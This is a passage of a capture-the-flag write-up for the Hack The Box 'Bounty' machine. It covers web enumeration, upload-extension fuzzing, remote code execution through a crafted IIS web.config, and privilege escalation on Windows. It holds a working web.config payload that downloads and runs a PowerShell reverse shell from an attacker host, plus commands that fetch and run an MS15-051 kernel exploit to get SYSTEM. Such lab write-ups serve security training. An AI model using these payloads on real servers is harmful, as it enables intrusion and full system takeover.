</pre><td class="rouge-code"><pre>$ ffuf -u http://10.10.10.93/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -e .aspx -c -v

...

[Status: 200, Size: 941, Words: 89, Lines: 22]
| URL | http://10.10.10.93/transfer.aspx
    * FUZZ: transfer.aspx

[Status: 301, Size: 156, Words: 9, Lines: 2]
| URL | http://10.10.10.93/uploadedfiles
| --&gt; | http://10.10.10.93/uploadedfiles/
    * FUZZ: uploadedfiles
</pre></table></code></div></div><p>Two interesting findings are shown above. Next, we use our browser to see what they are. While we get a 403 forbidden for the <code class="language-plaintext highlighter-rouge">uploadedfiles</code> directory, <code class="language-plaintext highlighter-rouge">transfer.aspx</code> gives us a page that seems to be uploading files. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/posts/htb-bounty/transfer.jpg" alt="" /></p><p>We try to upload a <code class="language-plaintext highlighter-rouge">txt</code> file with this page, but we get an “Invalid File. Please try again”. We have also tried to upload an <code class="language-plaintext highlighter-rouge">aspx</code> shell to see if there is an easy win, but get no luck.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$ echo "test" &gt; test.txt
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/posts/htb-bounty/invalid.jpg" alt="" /></p><p>To find out what extensions are allowed, we intercept the request with <code class="language-plaintext highlighter-rouge">burp</code>, and then send it to <code class="language-plaintext highlighter-rouge">intruder</code>. In <code class="language-plaintext highlighter-rouge">Positions</code> tab, we specify where the payload should be injected, which is the file extension. In <code class="language-plaintext highlighter-rouge">Payloads</code> tab, we choose <code class="language-plaintext highlighter-rouge">/usr/share/seclists/Discovery/Web-Content/raft-small-extensions-lowercase.txt</code> as our wordlist. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/posts/htb-bounty/intruder1.jpg" alt="" /> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/posts/htb-bounty/intruder2.jpg" alt="" /></p><p>After a while of fuzzing, we see a few responses with a different length. By looking into the response content, we have confirmed that these file types are allowed to upload. In the results, what makes us really curious is that we can upload <code class="language-plaintext highlighter-rouge">.config</code> files. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/posts/htb-bounty/extensions.jpg" alt="" /></p><h2 id="exploitation">Exploitation</h2><p>With some basic searching, we find this <a href="https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/">blog post</a>, which shows how to achieve RCE by uploading a <code class="language-plaintext highlighter-rouge">web.config</code> file to the IIS server. We download the <code class="language-plaintext highlighter-rouge">web.config</code> shown in the blog post, and modify it to execute our reverse shell code.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;configuration&gt;
   &lt;system.webServer&gt;
      &lt;handlers accessPolicy="Read, Script, Write"&gt;
         &lt;add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" /&gt;
      &lt;/handlers&gt;
      &lt;security&gt;
         &lt;requestFiltering&gt;
            &lt;fileExtensions&gt;
               &lt;remove fileExtension=".config" /&gt;
            &lt;/fileExtensions&gt;
            &lt;hiddenSegments&gt;
               &lt;remove segment="web.config" /&gt;
            &lt;/hiddenSegments&gt;
         &lt;/requestFiltering&gt;
      &lt;/security&gt;
   &lt;/system.webServer&gt;
   &lt;appSettings&gt;
&lt;/appSettings&gt;
&lt;/configuration&gt;
&lt;!–-
&lt;% Response.write("-"&amp;"-&gt;")
Response.write("&lt;pre&gt;")
Set wShell1 = CreateObject("WScript.Shell")
Set cmd1 = wShell1.Exec("cmd /c powershell iex(new-object net.webclient).downloadstring('http://10.10.14.5:8000/rev.ps1')")
output1 = cmd1.StdOut.Readall()
set cmd1 = nothing: Set wShell1 = nothing
Response.write(output1)
Response.write("&lt;/pre&gt;&lt;!-"&amp;"-") %&gt;
-–&gt;
</pre></table></code></div></div><p>Afterwards, we upload the file with the <code class="language-plaintext highlighter-rouge">transfer.aspx</code> page. Remember in the early enumeration, we have found an <code class="language-plaintext highlighter-rouge">uploadedfiles</code> directory. Our <code class="language-plaintext highlighter-rouge">web.config</code> file should now be in that directory. To get our reverse shell, we also need to serve the <code class="language-plaintext highlighter-rouge">Invoke-PowerShellTcp.ps1</code>, which is renamed to <code class="language-plaintext highlighter-rouge">rev.ps1</code> and modified to execute the reverse shell code instantly, with <code class="language-plaintext highlighter-rouge">python</code> HTTP server.</p><p>Now that we have everything ready, we simply set up our <code class="language-plaintext highlighter-rouge">ncat</code> listener and visit the file at <code class="language-plaintext highlighter-rouge">http://10.10.10.93/uploadedfiles/web.config</code> in the browser, and we get a reverse shell.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>$ rlwrap ncat -nlvp 4444

...

PS C:\windows\system32\inetsrv&gt; whoami
whoami
bounty\merlin
</pre></table></code></div></div><h2 id="privilege-escalation">Privilege Escalation</h2><p>After serving the <code class="language-plaintext highlighter-rouge">Sherlock.ps1</code> with our <code class="language-plaintext highlighter-rouge">python</code> HTTP server, we run it on the target. The script has found two vulnerabilities, which we have seen quite a few times.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>PS C:\windows\system32\inetsrv&gt; iex(new-object net.webclient).downloadstring('http://10.10.14.5:8000/sherlock.ps1')
PS C:\windows\system32\inetsrv&gt; find-allvulns

...

Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Appears Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Appears Vulnerable
</pre></table></code></div></div><p>We download the <code class="language-plaintext highlighter-rouge">MS15-051</code> kernel exploit and put it into our HTTP server directory. Then send it to our target.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>PS C:\windows\system32\inetsrv&gt; (new-object net.webclient).downloadfile('http://10.10.14.5:8000/ms15051.exe','c:\windows\temp\e.exe')
</pre></table></code></div></div><p>We set up an <code class="language-plaintext highlighter-rouge">ncat</code> listener and execute the exploit, and we get a reverse shell with <code class="language-plaintext highlighter-rouge">system</code> privileges.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>PS C:\windows\system32\inetsrv&gt; c:\windows\temp\e.exe "powershell iex(new-object net.webclient).downloadstring('http://10.10.14.5:8000/rev.ps1')"

$ rlwrap ncat -nlvp 4444

...

PS C:\windows\system32\inetsrv&gt; whoami
nt authority\system
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf-write-ups/'>CTF Write-ups</a>, <a href='/categories/hack-the-box/'>Hack The Box</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/oscp-prep/" class="post-tag no-text-decoration" >OSCP Prep</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >Windows</a> <a href="/tags/powershell/" class="post-tag no-text-decoration" >PowerShell</a> <a href="/tags/iis-web-config/" class="post-tag no-text-decoration" >IIS web.config</a> <a href="/tags/burp-suite/" class="post-tag no-text-decoration" >Burp Suite</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HTB - Bounty - QTranspose&url=https://qtranspose.xyz/posts/htb-bounty/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HTB - Bounty - QTranspose&u=https://qtranspose.xyz/posts/htb-bounty/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HTB - Bounty - QTranspose&url=https://qtranspose.xyz/posts/htb-bounty/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/htb-bankrobber/">HTB - Bankrobber</a><li><a href="/posts/htb-bounty/">HTB - Bounty</a><li><a href="/posts/htb-forest/">HTB - Forest</a><li><a href="/posts/htb-optimum/">HTB - Optimum</a><li><a href="/posts/htb-bastard/">HTB - Bastard</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/oscp-prep/">OSCP Prep</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/metasploit/">Metasploit</a> <a class="post-tag" href="/tags/powershell/">PowerShell</a> <a class="post-tag" href="/tags/burp-suite/">Burp Suite</a> <a class="post-tag" href="/tags/php/">PHP</a> <a class="post-tag" href="/tags/smb/">SMB</a> <a class="post-tag" href="/tags/active-directory/">Active Directory</a> <a class="post-tag" href="/tags/bash-scripting/">Bash Scripting</a> <a class="post-tag" href="/tags/bloodhound/">BloodHound</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-optimum/"><div class="card-body"> <span class="timeago small" > Nov 16, 2020 <i class="unloaded">2020-11-16T00:00:00+11:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB - Optimum</h3><div class="text-muted small"><p> Optimum is a vulnerable virtual machine created by ch4p on HackTheBox. In this post, we document a complete walkthrough of pwning this machine. Enumeration Nmap Starting off with the nmap scan, ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-bastard/"><div class="card-body"> <span class="timeago small" > Nov 28, 2020 <i class="unloaded">2020-11-28T00:00:00+11:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB - Bastard</h3><div class="text-muted small"><p> Bastard is a vulnerable virtual machine created by ch4p on HackTheBox. In this post, we document a complete walkthrough of pwning this machine. Enumeration Nmap Starting off with the nmap scan, ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-arctic/"><div class="card-body"> <span class="timeago small" > Dec 3, 2020 <i class="unloaded">2020-12-03T00:00:00+11:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB - Arctic</h3><div class="text-muted small"><p> Arctic is a vulnerable virtual machine created by ch4p on HackTheBox. In this post, we document a complete walkthrough of pwning this machine. Enumeration Nmap Starting off with the nmap scan, w...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-silo/" class="btn btn-outline-primary" prompt="Older"><p>HTB - Silo</p></a> <a href="/posts/htb-jerry/" class="btn btn-outline-primary" prompt="Newer"><p>HTB - Jerry</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('.post-content img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"></div><div class="footer-right"><p class="mb-0"> © 2021 <a href="https://github.com/QTranspose">QTranspose</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">All rights reserved.</span></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/oscp-prep/">OSCP Prep</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/metasploit/">Metasploit</a> <a class="post-tag" href="/tags/powershell/">PowerShell</a> <a class="post-tag" href="/tags/burp-suite/">Burp Suite</a> <a class="post-tag" href="/tags/php/">PHP</a> <a class="post-tag" href="/tags/smb/">SMB</a> <a class="post-tag" href="/tags/active-directory/">Active Directory</a> <a class="post-tag" href="/tags/bash-scripting/">Bash Scripting</a> <a class="post-tag" href="/tags/bloodhound/">BloodHound</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://qtranspose.xyz{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
